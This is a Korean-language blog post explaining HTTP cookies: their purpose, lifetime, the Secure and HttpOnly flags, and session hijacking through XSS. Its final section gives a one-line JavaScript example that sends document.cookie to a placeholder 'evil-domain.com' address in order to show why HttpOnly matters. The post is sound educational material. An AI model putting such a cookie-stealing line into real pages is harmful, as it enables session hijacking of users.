---
layout: post
title: "쿠키(cookie)"
subtitle: ""
comments: true
categories : HTTP
date: 2022-07-20
background: '/img/posts/06.jpg'
---

# 소개
Cookie에 대해서 공부하는데 MDN을 출처로 하여 [적은 글](https://velog.io/@mokyoungg/HTTP-%EC%BF%A0%ED%82%A4Cookie){:target="_blank"}을 보게 됐습니다.
FE 관련된 공부를 할 때 항상 MDN을 참고하지만 내용이 너무 많기도 하고 번역이 어색한 부분도 있어 보기가 어려웠는데 해당 글을 보면서 많은 도움을 받았습니다.
Cookie의 개념을 잡을 수 있는 좋은 글인 것 같아 참고 하여 작성합니다.

## HTTP 쿠키란 무엇인가
서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각이라고 할 수 있습니다.
실제로 개발자 도구 > Application > Cookies를 보시면 Name/value로 매핑된 쿠키의 리스트를 확인 하실 수 있습니다.
브라우저는 이 데이터 조각들을 저장했다가 동일한 서버에서 재요청이 들어 오면 저장된 데이터를 함께 전송합니다.
쿠키는 요청이 동일한 브라우저에서 들어왔는지 아닌지를 판단할 때 주로 사용됩니다.
상태가 없는(statelss) HTTP 프로토콜에서 상태 정보를 기억시켜주기 때문입니다.
과거에는 클라이언트 측에 정보를 저장할 때 쿠키를 주로 사용했습니다.
지금은 modern storage APIs(localStorage/sessionStorage)를 사용해 정보를 저장하는 걸 권장합니다.(IndexedDB도 권장)
모든 요청마다 쿠키가 함께 전송되기 때문에 성능이 떨어지는 원인이 될 수도 있습니다.
하지만 쿠키는 아직도 정말 많이 사용되기 때문에 반드시 알고 있어야할 필요가 있습니다.

## 쿠키의 목적
- 세션 관리(Session management) : 서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등의 정보 관리
- 개인화(Personalization) : 사용자 선호, 테마 등의 세팅
- 트래킹(Tracking) : 사용자 행동을 기록하고 분석하는 용도

## 쿠키의 라이프 타임
- session 쿠키 : 현재 세션이 끝날 때 삭제된다. 브라우저는 '현재 세션'이 끝나는 시점을 정의합니다.(물론 브라우저 재시작시 세션을 복원해 세션 쿠키를 무기한 존재할 수 있도록 하는 방법도 있습니다.)
- persistent 쿠키 : Expires 속성에 명시된 날짜에 삭제되거나, Max-Age 속성에 명시된 기간 이후에 삭제된다.
```
Expires 속성의 예시
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

## Secure와 HttpOnly 쿠키
Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된 요청일 경우에만 전송됩니다.
하지만 Secure 일지라도 민감한 정보는 절대 쿠키에 저장하면 안됩니다.
본질적으로 안전하지 않고 이 값이 보안을 제공하는게 아니기 때문입니다. 쉽게 말하면 그냥 열람할 수 있는 정보입니다.
Cross-site 스크립팅(XSS) 공격을 방지하기 위해 사용되는 HttpOnly 쿠키는 Javascript의 document.cookie API에 접근할 수 없습니다.
```
Secure HttpOnly
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

## document.cookie를 사용한 자바스크립트 접근
새로운 쿠키들은 document.cookie를 사용해 만들어질 수도 있으며, HttpOnly플래그가 설정되지 않은 경우 자바스크립트로 부터 접근될 수 있습니다.
즉 HttpOnly 플래그가 없으면 자바스크립트도 쿠키를 제어할 수 있다는 의미 입니다.

## 세션 하이재킹과 XSS
쿠키는 대개 웹 애플리케이션에서 사용자와 그들의 인증된 세션을 식별하기 위해 사용됩니다.
그래서 쿠키를 가로채는 것은 인증된 사용자의 세션 하이재킹으로 이어질 수 있습니다.
```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
HttpOnly 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 막을 수 있는 최소한의 장치 입니다.

 

## 참고
- [크롬 개발자 도구로 보는 HTTP 헤더 알아보기](https://velog.io/@mokyoungg/HTTP-%EC%BF%A0%ED%82%A4Cookie)


--- 

{% highlight ruby linenos %}
{% endhighlight %}

{% if page.comments %}
<div id="post-disqus" class="container">
{% include disqus.html %}
</div>
{% endif %}
